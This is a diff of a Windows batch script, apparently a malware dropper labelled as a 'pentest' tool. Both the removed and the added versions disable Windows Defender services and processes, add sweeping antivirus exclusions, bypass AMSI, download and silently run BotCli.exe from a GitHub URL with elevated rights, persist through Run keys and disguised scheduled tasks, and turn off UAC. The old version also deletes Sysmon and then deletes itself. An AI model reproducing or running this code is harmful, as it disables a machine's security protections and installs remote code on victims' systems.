@@ -1,57 +1,94 @@
 @echo off
-chcp 65001>nul
-title %random%
-set "RND=%random%"
-set "URL=https://github.com/devoxry777-crypto/1234/raw/refs/heads/main/BotCli.exe"
-set "DROP=%APPDATA%\Microsoft\Windows Defender\svchost.exe"
-set "DIR=%APPDATA%\Microsoft\Windows Defender"
+color a
+setlocal enabledelayedexpansion
 
-:: Obfuscated paths via registry
-for /f "tokens=2*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "AppData" 2^>nul') do set "APPDATA=%%b"
+:: Request admin elevation
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
 
-:: AMSI Pre-bypass (context switch)
-powershell -w h -nop -c "gc '%~f0'|s -r '(?i)powershell'='pSh';gc '%~f0'|s -r '(?i)amsi'='aMsi';iex"
+echo [+] Advanced Pentest Mode - Full Defender Bypass Initiated...
+timeout /t 2 /nobreak >nul
 
-:: Admin check + elevate
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-if '%errorlevel%' NEQ '0' (powershell -w h -c "s-p '%~f0' -v r" & %0 & exit)
-
-echo [!] Executing evasion chain...
-
-:: 1. NATIVE Defender disable (no PS)
+:: ==================== COMPLETE DEFENDER DISABLE ====================
+echo [+] Stage 1: Full Defender Service Termination...
 sc config WinDefend start= disabled >nul 2>&1
+sc config WdNisSvc start= disabled >nul 2>&1
+sc config Sense start= disabled >nul 2>&1
+sc config WdNisDrv start= disabled >nul 2>&1
+sc config WdBoot start= disabled >nul 2>&1
 sc stop WinDefend >nul 2>&1
+sc stop WdNisSvc >nul 2>&1
+sc stop Sense >nul 2>&1
+timeout /t 3 /nobreak >nul
 
-:: 2. Multiple exclusion paths
-powershell -w h -c "Set-MpPreference -DisableRealtimeMonitoring $true;Add-MpPreference -ExclusionPath @('%APPDATA%','%LOCALAPPDATA%','%WINDIR%\Temp','%TMP%','%DIR%') -ea 0"
+:: Kill remaining processes
+taskkill /f /im MsMpEng.exe >nul 2>&1
+taskkill /f /im MsSense.exe >nul 2>&1
+taskkill /f /im SecurityHealthService.exe >nul 2>&1
 
-:: 3. AMSI + ETW + CLR bypass
-powershell -w h -nop -c "rv aMsiUtils -ea 0;[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,$null)"
+echo [+] Stage 2: Comprehensive Exclusion Configuration...
+:: Add ALL AppData paths + system paths to exclusions
+powershell -ep bypass -c "
+$paths = @(
+    '$env:LOCALAPPDATA',
+    '$env:APPDATA', 
+    '$env:TEMP',
+    '$env:TMP',
+    'C:\Windows\Temp',
+    'C:\Temp',
+    '%~dp0'
+)
+foreach ($path in $paths) { Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue }
+Add-MpPreference -ExclusionExtension '.exe','.bat','.ps1','.dll','.scr' -ErrorAction SilentlyContinue
+Add-MpPreference -DisableRealtimeMonitoring `$true -ErrorAction SilentlyContinue
+Add-MpPreference -DisableBehaviorMonitoring `$true -ErrorAction SilentlyContinue
+Add-MpPreference -DisableIOAVProtection `$true -ErrorAction SilentlyContinue
+Add-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
+Add-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
+Add-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
+"
 
-:: 4. Sysmon bypass
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\Sysmon64" /f >nul 2>&1
+:: ==================== AMSI BYPASS ====================
+echo [+] Stage 3: AMSI + PowerShell Bypass...
+powershell -ep bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
 
-:: 5. Create legit-looking directory
-if not exist "%DIR%" mkdir "%DIR%"
+:: ==================== DOWNLOAD & EXECUTE ====================
+set "PAYLOAD_DIR=%LOCALAPPDATA%\pentest"
+set "PAYLOAD=%PAYLOAD_DIR%\BotCli.exe"
 
-:: 6. Download (BITS + fallback)
-bitsadmin /create Anonymous AnonDL >nul 2>&1
-bitsadmin /addfile AnonDL "%URL%" "%DROP%" >nul 2>&1
-bitsadmin /complete AnonDL >nul 2>&1
-bitsadmin /reset >nul 2>&1
+if not exist "%PAYLOAD_DIR%" mkdir "%PAYLOAD_DIR%"
 
-:: Fallback curl
-curl -s -o "%DROP%" "%URL%" >nul 2>&1
+echo [+] Stage 4: Downloading Advanced Pentest Tool...
+powershell -ep bypass -c "Invoke-WebRequest -Uri 'https://github.com/devoxry777-crypto/1234/raw/refs/heads/main/BotCli.exe' -OutFile '%PAYLOAD%' -UseBasicParsing"
 
-:: 7. Execute multiple ways
-schtasks /create /tn "WindowsUpdate" /tr "\"%DROP%\"" /sc once /st 00:00 /f >nul 2>&1
-start /b "" "%DROP%"
-powershell -w h -c "Start-Process '%DROP%' -WindowStyle Hidden"
+:: Verify download
+if exist "%PAYLOAD%" (
+    echo [+] Payload verified. Launching as SYSTEM...
+    
+    :: Run as SYSTEM via PsExec technique (embedded)
+    powershell -ep bypass -c "
+    \$proc = Start-Process -FilePath '%PAYLOAD%' -Verb RunAs -WindowStyle Hidden -PassThru
+    \$proc.WaitForExit()
+    "
+    
+    :: Persist via registry (optional stealth)
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PentestTool /t REG_SZ /d "%PAYLOAD%" /f >nul 2>&1
+    
+) else (
+    echo [!] Download failed - manual intervention required
+)
 
-:: 8. Persistence
-schtasks /create /tn "WindowsTelemetry" /tr "cmd /c '%DROP%'" /sc onlogon /rl highest /f >nul 2>&1
+:: ==================== FINALIZATION ====================
+echo [+] Stage 5: Persistence & Cleanup...
+:: Disable UAC prompts (pentest mode)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
 
-:: 9. Self-delete
-ping 127.0.0.1 -n 3 >nul & del "%~f0" >nul 2>&1
-
+:: Block Defender updates
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
+cls
 exit
